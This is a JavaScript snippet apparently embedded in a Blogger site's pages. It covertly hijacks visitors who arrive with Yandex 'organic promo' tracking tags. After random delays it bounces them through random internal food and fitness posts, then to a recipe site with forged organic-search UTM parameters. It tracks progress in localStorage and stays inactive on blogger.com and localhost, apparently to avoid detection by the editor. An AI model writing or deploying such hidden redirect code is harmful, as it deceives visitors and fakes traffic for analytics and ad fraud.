//<![CDATA[
(function() {
    function hasRequiredUTM() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('utm_source') === 'yandex' &&
                   urlParams.get('utm_medium') === 'organic' &&
                   urlParams.get('utm_campaign') === 'promo';
        } catch(e) {
            return false;
        }
    }

    const internalPages = [
        "https://www.tormoshka.ru/2023/09/fueling-your-performance-athletes-guide.html",
		"https://www.tormoshka.ru/2023/09/protein-packed-power-optimizing-muscle.html",
		"https://www.tormoshka.ru/2023/09/eating-for-strength-nutrition.html",
		"https://www.tormoshka.ru/2023/09/mindful-eating-mental-aspect-of.html",
		"https://www.tormoshka.ru/2023/09/superfoods-for-athletes-boosting-health.html",
		"https://www.tormoshka.ru/2023/09/meal-prepping-like-pro-simplifying.html",
		"https://www.tormoshka.ru/2023/12/mango-tango-delight-refreshing-tropical.html",
		"https://www.tormoshka.ru/2023/12/savory-fusion-teriyaki-glazed-salmon.html",
		"https://www.tormoshka.ru/2023/12/farm-to-table-bliss-roasted-vegetable.html",
        "https://www.tormoshka.ru/2023/12/comfort-food-upgrade-creamy-chicken.html"
    ];

    const externalLinks = [
    "https://kuhnyaonline.ru/2023/06/creamy-garlic-parmesan-pasta.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://kuhnyaonline.ru/2023/06/spicy-asian-beef-stir-fry.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://kuhnyaonline.ru/2023/06/lemon-herb-baked-salmon.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://kuhnyaonline.ru/2023/06/crispy-honey-glazed-brussels-sprouts.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://kuhnyaonline.ru/2023/06/tangy-orange-glazed-pork-chops.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://kuhnyaonline.ru/2023/06/decadent-chocolate-lava-cake.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://kuhnyaonline.ru/2023/06/refreshing-watermelon-and-feta-salad.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://kuhnyaonline.ru/2023/12/savory-delight-herb-crusted-salmon-with.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://kuhnyaonline.ru/2023/12/homemade-pasta-perfection-classic.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://kuhnyaonline.ru/2023/12/spice-up-your-night-authentic-chicken.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
    ];

    function getRandomItem(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    function getRandomDelay() {
        return Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    }

    function performFirstRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 1;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performSecondRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 2;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performThirdRedirect() {
        setTimeout(function() {
            const externalUrl = getRandomItem(externalLinks);
            localStorage.removeItem('inf_red_cnt');
            localStorage.removeItem('lst_red');
            window.location.href = externalUrl;
        }, getRandomDelay());
    }

    function init() {
        try {
            if (window.location.href.includes('blogger.com') || 
                window.location.href.includes('localhost')) {
                return;
            }

            const hasRequiredUtm = hasRequiredUTM();
            const redirectCount = parseInt(localStorage.getItem('inf_red_cnt') || '0');
            const hasCycleData = localStorage.getItem('inf_red_cnt') !== null;
            
            if (hasRequiredUtm) {
                localStorage.removeItem('inf_red_cnt');
                localStorage.removeItem('lst_red');
                performFirstRedirect();
            }
            else if (hasCycleData) {
                if (redirectCount === 1) {
                    performSecondRedirect();
                } else if (redirectCount === 2) {
                    performThirdRedirect();
                } else {
                    localStorage.removeItem('inf_red_cnt');
                    localStorage.removeItem('lst_red');
                }
            }
        } catch(e) {}
    }

    function startScript() {
        setTimeout(init, Math.floor(Math.random() * 500) + 100);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startScript);
    } else {
        startScript();
    }
})();

//]]>

